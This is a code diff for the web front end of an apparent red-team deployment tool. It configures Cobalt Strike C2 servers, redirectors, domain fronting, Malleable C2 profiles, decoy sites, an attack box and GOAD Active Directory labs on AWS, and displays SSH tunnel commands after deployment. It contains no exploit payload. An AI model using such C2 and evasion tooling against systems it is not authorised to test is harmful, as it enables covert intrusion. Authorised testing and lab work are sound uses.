+                if (manualInfo) manualInfo.style.display = this.value === 'manual' ? 'block' : 'none';
+                if (presetFields) presetFields.style.display = this.value === 'preset' ? 'block' : 'none';
+            };
+        });
 
         // Show and populate overview
         overviewDiv.style.display = 'block';
@@ -2032,24 +7027,23 @@ async function saveConfig() {
             return;
         }
         
-        // Parse backup domains
-        const backupDomainsInput = document.getElementById('backup-domains').value;
-        const backupDomains = backupDomainsInput
-            .split(',')
-            .map(d => d.trim())
-            .filter(d => d.length > 0)
-            .map(d => ({ domain_name: d, hosted_zone_id: '' }));
-        
+        // Parse backup domains from multi-select (exclude primary domain)
+        const backupSelect = document.getElementById('backup-domains');
+        const primaryDomainVal = document.getElementById('primary-domain')?.value?.trim() || '';
+        const backupDomains = Array.from(backupSelect.selectedOptions)
+            .map(o => o.value)
+            .filter(d => d.length > 0 && d !== primaryDomainVal);
+
         // Get deployment type and extract c2Mode and goadLab
         const deploymentType = document.getElementById('deployment-type')?.value || '';
         const deployConfig = DEPLOYMENT_CONFIGS[deploymentType] || {};
-        
+
         // Get SSL configuration
         const enableSsl = document.getElementById('enable-ssl')?.checked ?? true;
         const sslProvider = document.getElementById('ssl-provider')?.value || 'letsencrypt';
         const adminEmail = document.getElementById('admin-email')?.value?.trim() || '';
         const sslAutoRetry = document.getElementById('ssl-auto-retry')?.checked ?? true;
-        
+
         // When domain fronting is enabled, force self-signed on redirector (ACM handles public SSL)
         const domainFrontingEnabled = document.getElementById('enable-domain-fronting')?.checked ?? false;
         const effectiveSslProvider = domainFrontingEnabled ? 'self-signed' : sslProvider;
@@ -2061,22 +7055,66 @@ async function saveConfig() {
             document.getElementById('admin-email')?.focus();
             return;
         }
-        
+
         const config = {
             deployment_type: deploymentType,
             engagement_type: deployConfig.c2Mode || '', // For backward compatibility
             goad_lab_type: deployConfig.goadLab || '',
+            goad_vpc_cidr: document.getElementById('goad-vpc-cidr')?.value?.trim() || '192.168.56.0/24',
             project_name: document.getElementById('project-name').value,
             environment: document.getElementById('environment').value,
             aws_region: document.getElementById('aws-region').value,
             key_pair_name: document.getElementById('key-pair-name').value,
             management_cidr_blocks: cidrBlocks,
-            primary_domain_name: document.getElementById('primary-domain').value.trim(),
+            primary_domain_name: primaryDomainVal,
             backup_domains: backupDomains,
             c2_subdomain: document.getElementById('c2-subdomain').value.trim() || 'api',
             www_subdomain: document.getElementById('www-subdomain').value.trim() || 'www',
             cdn_subdomain: document.getElementById('cdn-subdomain').value.trim() || 'cdn',
-            malleable_profile: document.getElementById('malleable-profile')?.value || 'default',
+            malleable_profile: (() => {
+                // If malleable section is hidden, use default (no CS profile needed)
+                const section = document.getElementById('malleable-profile-section');
+                if (section && section.style.display === 'none') return 'default';
+                const val = document.getElementById('malleable-profile')?.value || 'default';
+                // Catalog profiles deploy via the custom pipeline
+                return val.startsWith('catalog:') ? 'custom' : val;
+            })(),
+            // Custom/catalog profile: base64-encode the content and parse URIs for nginx
+            custom_profile_content: (() => {
+                // Skip if malleable section is hidden
+                const section = document.getElementById('malleable-profile-section');
+                if (section && section.style.display === 'none') return '';
+                const profile = document.getElementById('malleable-profile')?.value;
+                // Custom: use textarea content — must not be empty
+                if (profile === 'custom') {
+                    const content = document.getElementById('custom-profile-content')?.value?.trim();
+                    if (!content) {
+                        throw new Error('Custom profile selected but no profile content provided. Paste your Malleable C2 profile or select a built-in profile.');
+                    }
+                    return btoa(unescape(encodeURIComponent(content)));
+                }
+                // Catalog: use cached fetched content
+                if (profile?.startsWith('catalog:') && APP._catalogProfileCache[profile]) {
+                    return btoa(unescape(encodeURIComponent(APP._catalogProfileCache[profile])));
+                }
+                return '';
+            })(),
+            custom_c2_uris: (() => {
+                const profile = document.getElementById('malleable-profile')?.value;
+                let content = null;
+                if (profile === 'custom') {
+                    content = document.getElementById('custom-profile-content')?.value?.trim();
+                } else if (profile?.startsWith('catalog:') && APP._catalogProfileCache[profile]) {
+                    content = APP._catalogProfileCache[profile];
+                }
+                if (content) {
+                    const parsed = parseMalleableProfileURIs(content);
+                    const hasURIs = parsed.get.length || parsed.post.length || parsed.stager_x86.length || parsed.stager_x64.length;
+                    return hasURIs ? JSON.stringify(parsed) : '';
+                }
+                return '';
+            })(),
+            decoy_theme: document.getElementById('decoy-theme')?.value || 'plexura',
             // SSL configuration (domain fronting overrides to self-signed)
             enable_ssl_certificate: enableSsl,
             ssl_provider: effectiveSslProvider,
@@ -2090,9 +7128,18 @@ async function saveConfig() {
             // Attack Box configuration
             enable_attack_box: document.getElementById('enable-attack-box')?.checked ?? true,
             attack_box_instance_type: document.getElementById('attack-box-instance-type')?.value || 't2.large',
-            attack_box_root_volume_size: parseInt(document.getElementById('attack-box-disk-size')?.value || '100')
+            attack_box_root_volume_size: parseInt(document.getElementById('attack-box-disk-size')?.value || '50'),
+            // Passwords (empty = auto-generate/manual)
+            attack_box_admin_password: document.querySelector('input[name="attack-box-pw-mode"]:checked')?.value === 'custom'
+                ? (document.getElementById('attack-box-password')?.value || '') : '',
+            cs_teamserver_password: document.querySelector('input[name="cs-pw-mode"]:checked')?.value === 'preset'
+                ? (document.getElementById('cs-teamserver-password')?.value || '') : '',
+            cobalt_strike_license_secret_name: document.querySelector('input[name="cs-license-mode"]:checked')?.value === 'secret'
+                ? 'cs-license-key' : '',
+            // REST API
+            enable_cs_rest_api: document.getElementById('enable-rest-api')?.checked || false
         };
-        
+
         const response = await fetch(`${API_BASE}/config/`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -2122,14 +7169,13 @@ async function validateConfig() {
             return;
         }
         
-        // Parse backup domains
-        const backupDomainsInput = document.getElementById('backup-domains').value;
-        const backupDomains = backupDomainsInput
-            .split(',')
-            .map(d => d.trim())
-            .filter(d => d.length > 0)
-            .map(d => ({ domain_name: d, hosted_zone_id: '' }));
-        
+        // Parse backup domains from multi-select (exclude primary domain)
+        const backupSelect = document.getElementById('backup-domains');
+        const primaryDomainVal = document.getElementById('primary-domain')?.value?.trim() || '';
+        const backupDomains = Array.from(backupSelect.selectedOptions)
+            .map(o => o.value)
+            .filter(d => d.length > 0 && d !== primaryDomainVal);
+
         // Get deployment type and extract engagement info
         const deploymentType = document.getElementById('deployment-type')?.value || '';
         const deployConfig = DEPLOYMENT_CONFIGS[deploymentType] || {};
@@ -2142,18 +7188,30 @@ async function validateConfig() {
             aws_region: document.getElementById('aws-region').value,
             key_pair_name: document.getElementById('key-pair-name').value,
             management_cidr_blocks: cidrBlocks,
-            primary_domain_name: document.getElementById('primary-domain').value.trim(),
+            primary_domain_name: primaryDomainVal,
             backup_domains: backupDomains,
-            c2_subdomain: document.getElementById('c2-subdomain').value.trim() || 'c2',
+            c2_subdomain: document.getElementById('c2-subdomain').value.trim() || 'api',
             www_subdomain: document.getElementById('www-subdomain').value.trim() || 'www',
             cdn_subdomain: document.getElementById('cdn-subdomain').value.trim() || 'cdn',
             c2_server_count: parseInt(document.getElementById('c2-server-count').value),
             c2_server_instance_type: document.getElementById('c2-instance-type').value,
             enable_domain_fronting: document.getElementById('enable-domain-fronting')?.checked ?? false,
+            // SSL configuration
+            enable_ssl: document.getElementById('enable-ssl')?.checked ?? true,
+            ssl_provider: document.getElementById('ssl-provider')?.value || 'letsencrypt',
+            admin_email: document.getElementById('admin-email')?.value?.trim() || '',
             // Attack Box configuration
             enable_attack_box: document.getElementById('enable-attack-box')?.checked ?? true,
             attack_box_instance_type: document.getElementById('attack-box-instance-type')?.value || 't2.large',
-            attack_box_root_volume_size: parseInt(document.getElementById('attack-box-disk-size')?.value || '100')
+            attack_box_root_volume_size: parseInt(document.getElementById('attack-box-disk-size')?.value || '50'),
+            // Passwords
+            attack_box_admin_password: document.querySelector('input[name="attack-box-pw-mode"]:checked')?.value === 'custom'
+                ? (document.getElementById('attack-box-password')?.value || '') : '',
+            cs_teamserver_password: document.querySelector('input[name="cs-pw-mode"]:checked')?.value === 'preset'
+                ? (document.getElementById('cs-teamserver-password')?.value || '') : '',
+            cobalt_strike_license_secret_name: document.querySelector('input[name="cs-license-mode"]:checked')?.value === 'secret'
+                ? 'cs-license-key' : '',
+            enable_cs_rest_api: document.getElementById('enable-rest-api')?.checked || false
         };
 
         const response = await fetch(`${API_BASE}/config/validate`, {
@@ -2172,6 +7230,109 @@ async function validateConfig() {
         }
     } catch (error) {
         showMessage('Error validating configuration: ' + error.message, 'error');
+    }
+}
+
+/**
+ * Reset the deploy page validation state (called on tab navigation)
+ */
+function resetDeployValidation() {
+    const btn = document.getElementById('validate-deploy-btn');
+    const hint = document.getElementById('validate-deploy-hint');
+    const actionsDiv = document.getElementById('deployment-actions');
+    const section = document.getElementById('validate-deploy-section');
+
+    if (btn) {
+        btn.textContent = 'Validate Configuration';
+        btn.disabled = false;
+        btn.style.background = '';
+        btn.style.borderColor = '';
+    }
+    if (hint) {
+        hint.style.color = 'var(--text-muted)';
+        hint.textContent = 'Validate your configuration to unlock deployment';
+    }
+    if (actionsDiv) {
+        actionsDiv.style.display = 'none';
+        actionsDiv.style.opacity = '0';
+        actionsDiv.style.transform = 'translateY(-10px)';
+    }
+    if (section) {
+        section.style.display = '';
+    }
+}
+
+/**
+ * Validate config from the Deploy page and animate in the deploy buttons on success
+ */
+async function validateAndUnlockDeploy() {
+    const btn = document.getElementById('validate-deploy-btn');
+    const hint = document.getElementById('validate-deploy-hint');
+    const actionsDiv = document.getElementById('deployment-actions');
+    if (!btn) return;
+
+    const originalText = btn.textContent;
+    btn.textContent = 'Validating...';
+    btn.disabled = true;
+
+    try {
+        // Load saved config from backend and validate it
+        const cfgResponse = await fetch(`${API_BASE}/config`);
+        const cfgData = await cfgResponse.json();
+
+        if (!cfgData.success || !cfgData.config || !cfgData.file_exists) {
+            if (hint) {
+                hint.style.color = 'var(--danger-text)';
+                hint.textContent = 'No saved configuration found. Go to the Configuration tab and save your settings first.';
+            }
+            btn.textContent = originalText;
+            btn.disabled = false;
+            return;
+        }
+
+        const response = await fetch(`${API_BASE}/config/validate`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ config: cfgData.config })
+        });
+        const data = await response.json();
+
+        if (data.success) {
+            // Validation passed — animate in the deploy buttons
+            btn.textContent = 'Validated';
+            btn.style.background = 'var(--success)';
+            btn.style.borderColor = 'var(--success)';
+            if (hint) {
+                hint.style.color = 'var(--success-text)';
+                hint.textContent = 'Configuration is valid — ready to deploy';
+            }
+
+            if (actionsDiv) {
+                actionsDiv.style.display = '';
+                // Trigger reflow so the transition plays
+                void actionsDiv.offsetHeight;
+                actionsDiv.style.opacity = '1';
+                actionsDiv.style.transform = 'translateY(0)';
+            }
+
+            // Also run prerequisite checks (SSH key, CS file, domain)
+            await updateDeploymentPrerequisites();
+        } else {
+            const errors = data.errors || [data.error || 'Validation failed'];
+            if (hint) {
+                hint.style.color = 'var(--danger-text)';
+                hint.textContent = errors.join(', ');
+            }
+            btn.textContent = originalText;
+            btn.disabled = false;
+        }
+    } catch (error) {
+        if (hint) {
+            hint.style.color = 'var(--danger-text)';
+            hint.textContent = 'Validation error: ' + error.message;
+        }
+        btn.textContent = originalText;
+        btn.disabled = false;
     }
 }
 
@@ -2201,7 +7362,7 @@ async function clearConfig() {
             'management-cidr': '',
             'primary-domain': '',
             'backup-domains': '',
-            'c2-subdomain': 'c2',
+            'c2-subdomain': 'api',
             'www-subdomain': 'www',
             'cdn-subdomain': 'cdn',
             'c2-server-count': '2',
@@ -2212,6 +7373,10 @@ async function clearConfig() {
             const element = document.getElementById(id);
             if (element) element.value = value;
         });
+
+        // Reset decoy theme
+        const decoyThemeSelect = document.getElementById('decoy-theme');
+        if (decoyThemeSelect) decoyThemeSelect.value = 'plexura';
 
         // Reset malleable profile and front domain
         const malleableSelect = document.getElementById('malleable-profile');
@@ -2233,7 +7398,7 @@ async function clearConfig() {
         const attackBoxInstanceType = document.getElementById('attack-box-instance-type');
         if (attackBoxInstanceType) attackBoxInstanceType.value = 't2.large';
         const attackBoxDiskSize = document.getElementById('attack-box-disk-size');
-        if (attackBoxDiskSize) attackBoxDiskSize.value = '100';
+        if (attackBoxDiskSize) attackBoxDiskSize.value = '50';
 
         // Reset checkboxes
         const dfCheckbox = document.getElementById('enable-domain-fronting');
@@ -2252,10 +7417,16 @@ async function clearConfig() {
         // Reset deployment type display
         updateDeploymentType();
         
-        // Clear the deployment overview
+        // Hide the deployment overview (preserve inner structure for future selections)
         const overviewDiv = document.getElementById('deployment-overview');
         if (overviewDiv) {
-            overviewDiv.innerHTML = '<p style="color: var(--text-muted); text-align: center;">Select a deployment type above to see details</p>';
+            overviewDiv.style.display = 'none';
+            const overviewTitle = document.getElementById('overview-title');
+            const overviewContent = document.getElementById('overview-content');
+            const overviewDetails = document.getElementById('overview-details');
+            if (overviewTitle) overviewTitle.textContent = 'Deployment Overview';
+            if (overviewContent) overviewContent.innerHTML = '';
+            if (overviewDetails) overviewDetails.innerHTML = '';
         }
         
         if (data.success) {
@@ -2448,6 +7619,53 @@ async function loadConfigSummary() {
 let deploymentPollInterval = null;
 let isPlanRunning = false;  // Flag to prevent polling from overwriting plan UI
 
+// ============================================================================
+// AUTO-REFRESH — Deployment Manager page
+// ============================================================================
+let autoRefreshInterval = null;
+
+function getAutoRefreshSeconds() {
+    const saved = localStorage.getItem('autoRefreshInterval');
+    return saved !== null ? parseInt(saved, 10) : 30;
+}
+
+function startAutoRefresh() {
+    stopAutoRefresh();
+    const seconds = getAutoRefreshSeconds();
+    if (seconds > 0 && typeof refreshAll === 'function') {
+        autoRefreshInterval = setInterval(() => refreshAll({ silent: true }), seconds * 1000);
+    }
+}
+
+function stopAutoRefresh() {
+    if (autoRefreshInterval) {
+        clearInterval(autoRefreshInterval);
+        autoRefreshInterval = null;
+    }
+}
+
+function applyAutoRefreshSetting() {
+    const select = document.getElementById('auto-refresh-interval');
+    if (!select) return;
+    const seconds = parseInt(select.value, 10);
+    localStorage.setItem('autoRefreshInterval', seconds);
+
+    // Restart if currently on deployments page
+    if (APP.currentPage === 'deployments') {
+        startAutoRefresh();
+    }
+}
+
+function initSettingsPage() {
+    const select = document.getElementById('auto-refresh-interval');
+    if (select) {
+        select.value = String(getAutoRefreshSeconds());
+    }
+    // Load cost tracker settings + project data
+    loadCostSettings();
+    loadCostProjectSelector();
+}
+
 async function checkDeploymentStatus() {
     // First update the deploy page based on selected deployment type
     updateDeployPageForType();
@@ -2466,22 +7684,30 @@ async function checkForActiveDeployment() {
     try {
         const response = await fetch(`${API_BASE}/deploy/status`);
         const data = await response.json();
-        
+
         if (data.success && data.status) {
             const status = data.status;
-            
-            // If there's an active deployment, update UI immediately
-            if (status.status === 'running') {
+
+            // If there's an active or completed deployment, show deploy actions
+            // directly (skip the validate gate)
+            if (status.status === 'running' || status.status === 'success' || status.status === 'error') {
+                const actionsDiv = document.getElementById('deployment-actions');
+                const validateSection = document.getElementById('validate-deploy-section');
+                if (actionsDiv) {
+                    actionsDiv.style.display = '';
+                    actionsDiv.style.opacity = '1';
+                    actionsDiv.style.transform = 'translateY(0)';
+                }
+                if (validateSection) validateSection.style.display = 'none';
+
                 updateDeploymentUI(status);
-                disableDeployButton(true, 'Deployment in progress...');
-            } else if (status.status === 'success') {
-                updateDeploymentUI(status);
-                disableDeployButton(false);
-            } else if (status.status === 'error') {
-                updateDeploymentUI(status);
-                disableDeployButton(false);
+                if (status.status === 'running') {
+                    disableDeployButton(true, 'Deployment in progress...');
+                } else {
+                    disableDeployButton(false);
+                }
             } else {
-                // Idle/ready - enable button
+                // Idle/ready - keep validate gate visible
                 disableDeployButton(false);
             }
         }
@@ -2527,6 +7753,56 @@ function disableDeployButton(disabled, message = '') {
 /**
  * Update deployment UI with status
  */
+function renderPhaseChecklist(status) {
+    const phases = status.phases || [];
+    const completed = status.phases_completed || [];
+    const currentName = status.current_phase_name || '';
+    const isFailed = status.status === 'error';
+
+    if (phases.length === 0) return '';
+
+    let html = '<div class="phase-checklist">';
+
+    phases.forEach((phase) => {
+        let icon, stateClass;
+
+        if (completed.includes(phase.name)) {
+            icon = '&#10003;';
+            stateClass = 'phase-done';
+        } else if (phase.name === currentName) {
+            if (isFailed) {
+                icon = '&#10007;';
+                stateClass = 'phase-failed';
+            } else {
+                icon = '';
+                stateClass = 'phase-active';
+            }
+        } else {
+            icon = '&#9675;';
+            stateClass = 'phase-pending';
+        }
+
+        // Show resource progress during the apply phase
+        let detail = '';
+        if (phase.name === 'apply' && phase.name === currentName) {
+            const done = status.resources_completed || 0;
+            const total = status.total_resources || 0;
+            if (total > 0) detail = `${done}/${total} resources`;
+        }
+
+        html += `
+            <div class="phase-item ${stateClass}">
+                <span class="phase-icon">${icon}</span>
+                <span class="phase-label">${phase.label}</span>
+                ${detail ? `<span class="phase-est">${detail}</span>` : ''}
+            </div>
+        `;
+    });
+
+    html += '</div>';
+    return html;
+}
+
 function updateDeploymentUI(status) {
     const statusDiv = document.getElementById('deployment-status');
     const outputDiv = document.getElementById('deployment-output');
@@ -2534,11 +7810,13 @@ function updateDeploymentUI(status) {
     
     if (status.status === 'running') {
         // Build enhanced status display
+        const projectLabel = status.project_name || window.currentDeploymentProject || '';
         let statusHtml = `
             <div style="margin-bottom: 15px;">
+                ${projectLabel ? `<div style="margin-bottom: 8px; font-size: 0.85em; color: var(--text-muted);">Project: <strong style="color: var(--brand);">${projectLabel}</strong></div>` : ''}
                 <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                     <strong style="font-size: 1.1em;">🚀 ${status.current_phase || status.step || 'Deploying...'}</strong>
-                    <span style="color: var(--text-muted);">${status.progress_percent || 0}%</span>
+                    <span class="t-muted">${status.progress_percent || 0}%</span>
                 </div>
 
                 <!-- Progress Bar -->
@@ -2546,23 +7824,27 @@ function updateDeploymentUI(status) {
                     <div style="background: var(--success); height: 100%; width: ${status.progress_percent || 0}%; transition: width 0.5s ease;"></div>
                 </div>
 
-                <div style="margin-top: 10px; color: var(--text-muted); font-size: 0.9em;">
-                    ⏱️ Elapsed: ${status.elapsed_formatted || '0m 0s'}
+                <div style="margin-top: 10px; display: flex; justify-content: space-between; align-items: center;">
+                    <span style="color: var(--text-muted); font-size: 0.9em;">Elapsed: ${status.elapsed_formatted || '0m 0s'}</span>
+                    <button class="btn btn-secondary" onclick="cancelDeployment()" style="font-size: 0.85em; padding: 4px 12px;">Cancel</button>
                 </div>
             </div>
         `;
-        
+
+        // Phase checklist
+        statusHtml += renderPhaseChecklist(status);
+
         // Recent logs
         if (status.logs && status.logs.length > 0) {
-            const recentLogs = status.logs.slice(-5);
+            const recentLogs = status.logs.slice(-30);
             statusHtml += `
-                <div style="background: var(--bg-terminal); color: var(--text-secondary); padding: 12px; border-radius: 6px; font-family: monospace; font-size: 0.88em;">
+                <div class="terminal-block" style="max-height: 350px; overflow-y: auto;">
                     ${recentLogs.map(log => {
                         const time = new Date(log.timestamp * 1000).toLocaleTimeString();
-                        const color = log.type === 'error' ? 'var(--danger-text)' :
-                                      log.type === 'success' ? 'var(--success-text)' :
-                                      log.type === 'warning' ? 'var(--warning-text)' : 'var(--accent-muted)';
-                        return `<div style="margin-bottom: 4px;"><span style="color: var(--text-muted);">[${time}]</span> <span style="color: ${color};">${log.message}</span></div>`;
+                        const color = log.type === 'error' ? '#F08A84' :
+                                      log.type === 'success' ? '#7ECF8C' :
+                                      log.type === 'warning' ? '#E8C56D' : '#8BB4D9';
+                        return `<div style="margin-bottom: 4px;"><span style="color: #7A849E;">[${time}]</span> <span style="color: ${color};">${log.message}</span></div>`;
                     }).join('')}
                 </div>
             `;
@@ -2571,14 +7853,67 @@ function updateDeploymentUI(status) {
         statusDiv.innerHTML = statusHtml;
         statusDiv.className = 'status-display info';
 
+        // Auto-scroll to keep latest logs visible
+        const logBlock = statusDiv.querySelector('[style*="bg-terminal"]');
+        if (logBlock) logBlock.scrollTop = logBlock.scrollHeight;
+
     } else if (status.status === 'success') {
         statusDiv.className = 'status-display success';
+        // Invalidate tools cache so new deployment shows in dropdown
+        if (typeof invalidateToolsProjectsCache === 'function') invalidateToolsProjectsCache();
+
+        // Extract connection info from Terraform outputs
+        const outputs = status.output || {};
+        const getVal = (key) => {
+            const o = outputs[key];
+            return o && o.value ? o.value : '';
+        };
+
+        let connectionHtml = '';
+        const bastionIp = getVal('bastion_public_ip');
+        const redirectorIps = getVal('proxy_redirector_public_ips') || [];
+        const c2Ips = getVal('c2_team_server_private_ips') || getVal('c2_server_primary_ip');
+        const c2IpList = Array.isArray(c2Ips) ? c2Ips : (c2Ips ? [c2Ips] : []);
+        const attackboxIp = getVal('attack_box_private_ip');
+
+        if (bastionIp || (Array.isArray(redirectorIps) && redirectorIps.length) || c2IpList.length) {
+            connectionHtml = '<div class="terminal-block" style="text-align: left; margin-top: 20px; padding: 15px; border-radius: 8px; font-size: 0.88em;">';
+            connectionHtml += '<div style="font-weight: 600; color: var(--success-text); margin-bottom: 10px; font-family: inherit;">Connection Info</div>';
+
+            if (bastionIp) {
+                connectionHtml += `<div style="margin-bottom: 8px;"><span class="t-muted">Bastion SSH:</span> <span class="t-terminal">ssh -i ~/.ssh/your_key ubuntu@${bastionIp}</span></div>`;
+            }
+            if (c2IpList.length > 0) {
+                connectionHtml += `<div style="margin-bottom: 8px;"><span class="t-muted">CS Tunnel:</span> <span class="t-terminal">ssh -L 50050:${c2IpList[0]}:50050 ubuntu@${bastionIp}</span></div>`;
+                connectionHtml += `<div style="margin-bottom: 8px;"><span class="t-muted">CS Client:</span> <span class="t-terminal">Connect to localhost:50050</span></div>`;
+                // CS password instructions — check if password was pre-set
+                const csPwMode = document.querySelector('input[name="cs-pw-mode"]:checked')?.value || 'manual';
+                if (csPwMode === 'manual') {
+                    connectionHtml += `<div style="margin-bottom: 8px; padding: 6px 8px; background: var(--bg-elevated); border-radius: 4px; font-size: 0.9em;"><span style="color: var(--gold-muted);">CS Password:</span> <span class="t-secondary">SSH to C2 server → run <code class="code-inline">sudo /opt/cobaltstrike/set-password.sh</code></span></div>`;
+                }
+            }
+            if (attackboxIp) {
+                connectionHtml += `<div style="margin-bottom: 8px;"><span class="t-muted">Attack Box RDP:</span> <span class="t-terminal">ssh -L 3389:${attackboxIp}:3389 ubuntu@${bastionIp}</span></div>`;
+            }
+            if (Array.isArray(redirectorIps) && redirectorIps.length > 0) {
+                connectionHtml += `<div style="margin-bottom: 4px;"><span class="t-muted">Redirector IPs:</span> <span class="t-terminal">${redirectorIps.join(', ')}</span></div>`;
+            }
+            const attackboxPw = getVal('attack_box_admin_password');
+            if (attackboxPw) {
+                connectionHtml += `<div style="margin-top: 8px; padding-top: 8px; border-top: 1px solid var(--border);"><span class="t-muted">Attack Box Password:</span> <span style="color: var(--warning-text); user-select: all;">${attackboxPw}</span></div>`;
+                connectionHtml += `<div style="font-size: 0.82em; color: var(--warning-text); margin-top: 4px;">Reset on first login: <code class="code-inline">net user Administrator NewPasswordHere</code></div>`;
+            }
+            connectionHtml += '<div style="margin-top: 10px; color: var(--warning-text); font-size: 0.85em;">Note: user_data scripts may still be running on instances. Wait ~5 minutes before connecting.</div>';
+            connectionHtml += '</div>';
+        }
+
         statusDiv.innerHTML = `
             <div style="text-align: center; padding: 20px;">
                 <div style="font-size: 3em; margin-bottom: 10px;">🎉</div>
                 <h3 style="color: var(--success-text); margin: 0 0 10px 0;">Deployment Complete!</h3>
-                <p style="color: var(--text-secondary);">Infrastructure has been successfully deployed.</p>
+                <p class="t-secondary">Infrastructure has been successfully deployed.</p>
                 <p style="color: var(--text-secondary); font-size: 0.9em;">Elapsed time: ${status.elapsed_formatted || 'Unknown'}</p>
+                ${connectionHtml}
                 <div style="margin-top: 15px;">
                     <button class="btn btn-primary" onclick="APP.navigateTo('deployments')">
                         View Deployment Details →
@@ -2587,6 +7922,33 @@ function updateDeploymentUI(status) {
             </div>
         `;
         
+        // Populate per-project cache from deploy outputs so lazy-load consumers have data
+        const _projName = status.project_name || window.currentDeploymentProject || '';
+        if (outputs && _projName && !getProjectData(_projName)) {
+            const depType = status.deployment_type || '';
+            const pd = {
+                bastion: { enabled: !!bastionIp, public_ip: bastionIp, private_ip: '', instance_id: '' },
+                c2_servers: { private_ips: c2IpList, servers: {}, instance_ids: [] },
+                redirectors: { public_ips: Array.isArray(redirectorIps) ? redirectorIps : [], instance_ids: [], private_ips: [] },
+                attack_box: { enabled: !!attackboxIp, private_ip: attackboxIp || '', admin_password: '', instance_id: '' },
+                deployment_type: depType,
+                config: {},
+                jumpbox_public_ip: getVal('goad_jumpbox_public_ip') || '',
+                teamserver_private_ip: c2IpList[0] || '',
+            };
+            // Include GOAD data for combined deployments
+            if (depType.startsWith('combined-')) {
+                pd.goad = {
+                    deployed: true,
+                    lab_type: getVal('goad_lab_type') || '',
+                    jumpbox: { public_ip: getVal('goad_jumpbox_public_ip'), private_ip: getVal('goad_jumpbox_private_ip') },
+                    vms: Array.isArray(getVal('goad_lab_vms')) ? getVal('goad_lab_vms') : [],
+                    domain_info: getVal('goad_domain_info') || {},
+                };
+            }
+            setProjectData(_projName, pd);
+        }
+
         // Show post-deployment steps based on deployment type
         const postDeploySteps = document.getElementById('post-deployment-steps');
         if (postDeploySteps) {
@@ -2606,7 +7968,7 @@ function updateDeploymentUI(status) {
                         <p style="margin: 0; font-size: 0.9em; color: var(--text-secondary);">
                             SSH to the jumpbox using your key (the one you uploaded before deployment):
                         </p>
-                        <code style="background: var(--bg-terminal); color: var(--accent-muted); padding: 8px 12px; border-radius: 4px; display: block; margin-top: 8px; font-size: 0.88em;">
+                        <code class="terminal-block" style="display: block; margin-top: 8px; font-size: 0.88em;">
                             ssh -i ~/.ssh/goad_key ubuntu@JUMPBOX_PUBLIC_IP
                         </code>
                     </div>
@@ -2616,7 +7978,7 @@ function updateDeploymentUI(status) {
                         <p style="margin: 0; font-size: 0.9em; color: var(--text-secondary);">
                             Once on the jumpbox, connect to the Team Server:
                         </p>
-                        <code style="background: var(--bg-terminal); color: var(--accent-muted); padding: 8px 12px; border-radius: 4px; display: block; margin-top: 8px; font-size: 0.88em;">
+                        <code class="terminal-block" style="display: block; margin-top: 8px; font-size: 0.88em;">
                             ssh teamserver
                         </code>
                     </div>
@@ -2626,7 +7988,7 @@ function updateDeploymentUI(status) {
                         <p style="margin: 0; font-size: 0.9em; color: var(--text-secondary);">
                             Create an SSH tunnel from your local machine to access the Team Server:
                         </p>
-                        <code style="background: var(--bg-terminal); color: var(--accent-muted); padding: 8px 12px; border-radius: 4px; display: block; margin-top: 8px; font-size: 0.88em;">
+                        <code class="terminal-block" style="display: block; margin-top: 8px; font-size: 0.88em;">
                             ssh -i ~/.ssh/goad_key -L 50050:192.168.56.40:50050 ubuntu@JUMPBOX_PUBLIC_IP
                         </code>
                         <p style="margin: 8px 0 0 0; font-size: 0.88em; color: var(--text-muted);">
@@ -2639,7 +8001,7 @@ function updateDeploymentUI(status) {
                         <p style="margin: 0 0 8px 0; font-size: 0.9em; color: var(--text-secondary);">
                             Step 1: Create an SSH tunnel for RDP access to AD VMs (run on YOUR local machine):
                         </p>
-                        <code style="background: var(--bg-terminal); color: var(--accent-muted); padding: 8px 12px; border-radius: 4px; display: block; margin-bottom: 12px; font-size: 0.88em;">
+                        <code class="terminal-block" style="display: block; margin-bottom: 12px; font-size: 0.88em;">
                             ssh -i ~/.ssh/goad_key -L 3389:192.168.56.10:3389 ubuntu@JUMPBOX_PUBLIC_IP
                         </code>
 
@@ -2661,8 +8023,61 @@ function updateDeploymentUI(status) {
                     </div>
                 `;
                 postDeploySteps.style.display = 'block';
-            } else if (isC2Only || isCombined) {
-                // C2 deployment - show DNS/SSL steps (original content)
+            } else if (isCombined) {
+                // Combined C2 + GOAD deployment - show C2 info AND GOAD jumpbox info
+                const jumpboxIp = getVal('goad_jumpbox_public_ip');
+                const goadLabType = getVal('goad_lab_type') || 'GOAD';
+                const combinedConfig = DEPLOYMENT_CONFIGS[deploymentType] || {};
+                const goadLabel = combinedConfig.goadLab || goadLabType;
+
+                let combinedHtml = '';
+
+                // C2 connection summary
+                combinedHtml += `
+                    <h4 style="margin: 0 0 15px 0; color: var(--success-text);">C2 Infrastructure Ready</h4>
+                    <p style="margin: 0 0 12px 0; font-size: 0.9em; color: var(--text-secondary);">
+                        Your C2 servers, redirectors, and bastion are deployed. Use the Deployment Manager for the full post-deployment checklist and connection details.
+                    </p>`;
+
+                // GOAD jumpbox section
+                if (jumpboxIp) {
+                    combinedHtml += `
+                    <div style="margin-top: 18px; padding-top: 16px; border-top: 1px solid var(--border);">
+                        <h4 style="margin: 0 0 12px 0; color: var(--success-text);">${goadLabel} Lab Deployed</h4>
+
+                        <div style="margin-bottom: 12px;">
+                            <h5 style="margin: 0 0 8px 0; color: var(--info-text);">Jumpbox Connection</h5>
+                            <code class="terminal-block" style="display: block; font-size: 0.88em;">
+                                ssh ubuntu@${jumpboxIp} -i ~/.ssh/id_ed25519
+                            </code>
+                        </div>
+
+                        <div style="padding: 14px; background: var(--warning-bg); border: 2px solid var(--warning); border-radius: 6px; margin-bottom: 12px;">
+                            <div style="font-weight: 600; color: var(--warning-text); margin-bottom: 6px; font-size: 0.95em;">Next Step: Provision Active Directory</div>
+                            <div style="font-size: 0.9em; color: var(--text-primary);">
+                                Go to <strong>Deployment Manager</strong> and click <strong>"Provision Active Directory"</strong> to set up the domain.
+                            </div>
+                            <div style="font-size: 0.85em; color: var(--text-secondary); margin-top: 6px;">
+                                AD provisioning takes approximately 15-20 minutes.
+                            </div>
+                        </div>
+                    </div>`;
+                }
+
+                combinedHtml += `
+                    <div style="margin-top: 14px; text-align: center;">
+                        <button class="btn btn-primary" onclick="APP.navigateTo('deployments')" style="padding: 8px 24px;">Open Deployment Manager</button>
+                    </div>`;
